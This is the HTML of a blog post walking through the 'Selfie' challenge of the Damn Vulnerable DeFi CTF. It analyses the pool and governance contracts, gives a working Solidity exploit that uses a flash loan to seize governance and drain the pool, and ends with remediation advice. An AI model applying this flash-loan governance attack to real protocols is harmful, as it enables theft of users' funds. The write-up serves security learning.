@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Vasiliy Yorkin">
+<meta name="description" content="After a short break, I&rsquo;m back and excited to keep going with these CTF walkthrough series.
+The current challenge is Selfie:
+Challenge A new cool lending pool has launched! It&rsquo;s now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it. What could go wrong, right? You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.">
+<meta name="keywords" content="Vasiliy Yorkin">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF walkthrough, Damn Vulnerable DeFi, #6 Selfie"/>
+<meta name="twitter:description" content="After a short break, I&rsquo;m back and excited to keep going with these CTF walkthrough series.
+The current challenge is Selfie:
+Challenge A new cool lending pool has launched! It&rsquo;s now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it. What could go wrong, right? You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all."/>
+
+<meta property="og:title" content="CTF walkthrough, Damn Vulnerable DeFi, #6 Selfie" />
+<meta property="og:description" content="After a short break, I&rsquo;m back and excited to keep going with these CTF walkthrough series.
+The current challenge is Selfie:
+Challenge A new cool lending pool has launched! It&rsquo;s now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it. What could go wrong, right? You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-6-selfie/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-02T08:12:00+03:00" />
+<meta property="article:modified_time" content="2022-11-02T08:12:00+03:00" />
+
+
+
+
+  <title>vyorkin.org</title>
+
+  
+  <link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-6-selfie/">
+  
+
+  <link rel="preload" href="https://vyorkin.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.bce1ad3fd9463aca56f0ae393ff86fb2a0d51b58b56e32625fa4af028409f02d.css" integrity="sha256-vOGtP9lGOspW8K45P/hvsqDVG1i1bjJiX6SvAoQJ8C0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+  
+  
+    
+    
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.e2e6584ce20683687b57e321b1116fbb5051e3534cc7846c9baccff833431b67.css" integrity="sha256-4uZYTOIGg2h7V&#43;MhsRFvu1BR41NMx4Rsm6zP&#43;DNDG2c=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+   
+
+
+
+
+  <link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
+<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  
+
+  <meta name="generator" content="Hugo 0.104.3" />
+
+
+  
+
+</head>
+
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://vyorkin.org/">
+      vyorkin.org
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/about/">4b0u7</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/posts/">bl06</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/ru-ru/">ru</a>
+              </li>
+            
+          
+            
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/de-de/">de</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-6-selfie/">
+              CTF walkthrough, Damn Vulnerable DeFi, #6 Selfie
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-11-02T08:12:00&#43;03:00">
+                November 2, 2022
+              </time>
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="https://vyorkin.org/categories/blockchain/">blockchain</a>
+      <span class="separator">•</span>
+    <a href="https://vyorkin.org/categories/ctf/">ctf</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/blockchain/">blockchain</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/ctf/">ctf</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/security/">security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <p>After a short break, I&rsquo;m back and excited to keep going with
+these CTF walkthrough series.</p>
+<p>The current challenge is <a href="https://www.damnvulnerabledefi.xyz/challenges/6.html">Selfie</a>:</p>
+<h2 id="challenge">
+  Challenge
+  <a class="heading-link" href="#challenge">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<blockquote class="quote2 quote2-question">A new cool lending pool has launched! It&rsquo;s now offering flash
+loans of DVT tokens. Wow, and it even includes a really fancy
+governance mechanism to control it. What could go wrong, right?
+You start with no DVT tokens in balance, and the pool has 1.5
+million. Your objective: take them all.
+</blockquote>
+
+<p>Looks like we might be able to abuse the governance using a
+flash loan to drain all the funds. We&rsquo;ll see ;)</p>
+<h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>There are 3 contracts that may be of interest to us:</p>
+<ul>
+<li><code>SelfiePool</code> &ndash; Offers flash loans. Managed by governance.</li>
+<li><code>SimpleGovernance</code> &ndash; Allows to queue and execute &ldquo;proposals&rdquo;.</li>
+<li><code>DamnValuableTokenSnapshot</code> &ndash; ERC20 token with a snapshot mechanism.</li>
+</ul>
+<h3 id="selfiepool">
+  SelfiePool
+  <a class="heading-link" href="#selfiepool">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>It provides the same flash loan functionality we have already
+seen many times before, expect that it has one extra function
+<code>drainAllFunds</code> that relies on governance. This function allows
+transfering all DVT&rsquo;s to the given address and it is guarded by
+the <code>onlyGovernance</code> modifier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> drainAllFunds(<span style="color:#fff;font-weight:bold">address</span> receiver) <span style="color:#fff;font-weight:bold">external</span> onlyGovernance {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amount = token.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>    token.<span style="color:#fff;font-weight:bold">transfer</span>(receiver, amount);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    emit FundsDrained(receiver, amount);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This modifier makes sure that the function is being called by the
+governance contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">modifier</span> onlyGovernance() {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> != <span style="color:#fff;font-weight:bold">address</span>(governance)) <span style="color:#fff;font-weight:bold">revert</span> OnlyGovernanceAllowed();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>All we need to do is to make the governance contract call the
+<code>drainAllFunds</code> function somehow.</p>
+<h3 id="simplegorvernance">
+  SimpleGorvernance
+  <a class="heading-link" href="#simplegorvernance">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>It has 2 functions to queue and execute action proposals:
+<code>queueAction</code> and <code>executeAction</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> queueAction(
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> receiver,
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">bytes</span> calldata <span style="color:#fff;font-weight:bold">data</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> weiAmount
+</span></span><span style="display:flex;"><span>) <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>) {
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (!_hasEnoughVotes(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>)) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughVotesToPropose();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (receiver == <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> CannotQueueActionsThatAffectGovernance();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
+</span></span></code></pre></div><p>The first function adds an action proposal to the queue, where
+the &ldquo;action proposal&rdquo; is an arbitrary function call at
+<code>receiver</code> address. It starts with 2 pre-conditions:</p>
+<ol>
+<li>To queue an action you should have more than a half of the
+total supply of governance tokens (DVT&rsquo;s) in the last
+snapshot. This is checked in the <code>_hasEnoughVotes</code> function
+(see below).</li>
+<li>The second pre-condition makes sure that the call target of
+the proposal action is not equal to the governance address.
+In other words, it forbids calling the governance contract
+from actions.</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">function</span> _hasEnoughVotes(<span style="color:#fff;font-weight:bold">address</span> account) <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">balance</span> = governanceToken.getBalanceAtLastSnapshot(account);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> halfTotalSupply = governanceToken
+</span></span><span style="display:flex;"><span>        .getTotalSupplyAtLastSnapshot() / <span style="color:#ff0;font-weight:bold">2</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">balance</span> &gt; halfTotalSupply;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s look at the second external function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> executeAction(<span style="color:#fff;font-weight:bold">uint256</span> actionId) <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (!_canBeExecuted(actionId)) <span style="color:#fff;font-weight:bold">revert</span> CannotExecuteThisAction();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    GovernanceAction <span style="color:#fff;font-weight:bold">storage</span> actionToExecute = actions[actionId];
+</span></span><span style="display:flex;"><span>    actionToExecute.executedAt = <span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    actionToExecute.receiver.functionCallWithValue(
+</span></span><span style="display:flex;"><span>        actionToExecute.<span style="color:#fff;font-weight:bold">data</span>,
+</span></span><span style="display:flex;"><span>        actionToExecute.weiAmount
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    emit ActionExecuted(actionId, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It checks that 2 days have passed since an action was queued by
+calling the <code>_canBeExecuted</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _canBeExecuted(<span style="color:#fff;font-weight:bold">uint256</span> actionId) <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>    GovernanceAction <span style="color:#fff;font-weight:bold">memory</span> actionToExecute = actions[actionId];
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">return</span> (actionToExecute.executedAt == <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp;
+</span></span><span style="display:flex; background-color:#191919"><span>        (<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> - actionToExecute.proposedAt &gt;=
+</span></span><span style="display:flex; background-color:#191919"><span>            ACTION_DELAY_IN_SECONDS));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="damnvaluabletokensnapshot">
+  DamnValuableTokenSnapshot
+  <a class="heading-link" href="#damnvaluabletokensnapshot">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>It inherits from
+<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Snapshot.sol">ERC20Snapshot</a>
+and has 3 new external functions:</p>
+<ul>
+<li><code>snapshot</code> &ndash; Creates a new snapshot and returns its ID.</li>
+<li><code>getBalanceAtLastSnapshot</code> &ndash; Returns balance of the given address at the time of the last snapshot.</li>
+<li><code>getTotalSupplyAtLastSnapshot</code> &ndash; Returns the total supply at the last snapshot time.</li>
+</ul>
+<p>We have seen a similar contract in a
+<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder">previous
+challenge</a>.</p>
+<h2 id="exploit">
+  Exploit
+  <a class="heading-link" href="#exploit">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>The question is: how can we submit a proposal action that would
+drain the pool? To do that we need to have a majority of DVT
+(governance) tokens. And how do we get them? By taking a flash
+loan!</p>
+<p>So our exploit scenario might look like this:</p>
+<ol>
+<li>Create a separate <code>Exploit</code> contract with 2 functions: <code>run</code>
+and <code>receiveTokens</code>.</li>
+<li>In its <code>run</code> function, take a flash loan and borrow all the
+governance tokens from the <code>SelfiePool</code>.</li>
+<li>Approve spending of DVT tokens for the attacker, who is the
+owner of our <code>Exploit</code> contract.</li>
+<li>Record a new snapshot.</li>
+<li>Now that we obviously have more than 50% of governance tokens
+(we have all of them), we can call the <code>queueAction</code> to queue
+the <code>drainAllFunds</code> proposal action.</li>
+<li>Repay the flash loan.</li>
+<li>Use the
+<a href="https://book.getfoundry.sh/cheatcodes/warp?highlight=vm.warp#examples">vm.warp</a>
+to travel in time 2 days ahead.</li>
+<li>Execute the proposed action, which will call the <code>drainAllFunds</code> on behalf of the governance contract.</li>
+<li>Transfer the all the funds from the <code>Exploit</code> contract to the
+<code>attacker</code>&rsquo;s address.</li>
+</ol>
+<p>Let&rsquo;s go ahead and implement the <code>Exploit</code> contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Exploit {
+</span></span><span style="display:flex;"><span>    SimpleGovernance <span style="color:#fff;font-weight:bold">private</span> gov;
+</span></span><span style="display:flex;"><span>    SelfiePool <span style="color:#fff;font-weight:bold">private</span> pool;
+</span></span><span style="display:flex;"><span>    DamnValuableTokenSnapshot <span style="color:#fff;font-weight:bold">private</span> dvts;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> owner;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> actionId;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(SelfiePool _pool, DamnValuableTokenSnapshot _dvts) {
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
+</span></span><span style="display:flex;"><span>        pool = _pool;
+</span></span><span style="display:flex;"><span>        dvts = _dvts;
+</span></span><span style="display:flex;"><span>        gov = _pool.governance();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = dvts.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(pool));
+</span></span><span style="display:flex;"><span>        pool.flashLoan(poolBalance);
+</span></span><span style="display:flex;"><span>        dvts.approve(owner, poolBalance);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> receiveTokens(<span style="color:#fff;font-weight:bold">address</span> _dvts, <span style="color:#fff;font-weight:bold">uint256</span> _amount) <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>        dvts.snapshot();
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">bytes</span> <span style="color:#fff;font-weight:bold">memory</span> payload = <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#0ff;font-weight:bold">&#34;drainAllFunds(address)&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        actionId = gov.queueAction(<span style="color:#fff;font-weight:bold">address</span>(pool), payload, <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>        DamnValuableTokenSnapshot(_dvts).<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(pool), _amount);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here is the high-level exploit code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
+</span></span><span style="display:flex;"><span>    Exploit expl = <span style="color:#fff;font-weight:bold">new</span> Exploit(selfiePool, dvtSnapshot);
+</span></span><span style="display:flex;"><span>    expl.run();
+</span></span><span style="display:flex;"><span>    vm.warp(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> + <span style="color:#ff0;font-weight:bold">2</span> <span style="color:#fff;font-weight:bold">days</span>);
+</span></span><span style="display:flex;"><span>    simpleGovernance.executeAction(expl.actionId());
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> totalAmount = dvtSnapshot.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(expl));
+</span></span><span style="display:flex;"><span>    dvtSnapshot.transferFrom(<span style="color:#fff;font-weight:bold">address</span>(expl), attacker, totalAmount);
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    validation();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And we&rsquo;re done! We have drained the pool and stolen all DVT&rsquo;s
+from it.</p>
+<h2 id="summary-and-notes">
+  Summary &amp; Notes
+  <a class="heading-link" href="#summary-and-notes">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>Flash loans could be used to abuse the gornance systems that
+rely on the majority of the token holders.</p>
+<p>This kind of manipulation attack happened in a real life recently:</p>
+<blockquote class="quote2 quote2-tip no-quote">Credit-based stablecoin protocol Beanstalk Farms lost all of its $182 million collateral from a security breach caused by two sinister governance proposals and a flash loan attack.
+</blockquote>
+
+<p>It isn&rsquo;t new and Beanstalk is unlikely to be the last victim.</p>
+<h2 id="remediation">
+  Remediation
+  <a class="heading-link" href="#remediation">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ol>
+<li>
+<p>Require separate transactions for depositing governance
+tokens and submitting a proposal action. Use some kind of vesting period.</p>
+</li>
+<li>
+<p>Use well tested implementations like <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance">primitives for on-chain governance</a> by OpenZeppelin.</p>
+</li>
+</ol>
+<h2 id="references">
+  References
+  <a class="heading-link" href="#references">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li><a href="https://cointelegraph.com/news/beanstalk-farms-loses-182m-in-defi-governance-exploit">Beanstalk Farms loses $182M in DeFi governance exploit</a></li>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a> &ndash; OpenZeppelin docs.</li>
+</ul>
+<hr>
+<p>Thank you for reading! You can find the full code
+<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/selfie/Selfie.t.sol">here</a>.</p>
+<p>Let&rsquo;s continue to the next challenge &ndash;
+<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder">#7
+Compromised</a>!</p>
+
+        
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"
+    integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"
+    integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js"
+    integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      1985 -
+    
+    2022
+     Vasiliy Yorkin 
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="https://vyorkin.org/js/coder.min.b9a9a8f029e2fd416957bf8489db1b684799393553df358655a1b614ec7c5ef9.js" integrity="sha256-uamo8Cni/UFpV7&#43;EidsbaEeZOTVT3zWGVaG2FOx8Xvk="></script>
+  
+
+  
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-F8R77TYF8B', { 'anonymize_ip': false });
+}
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
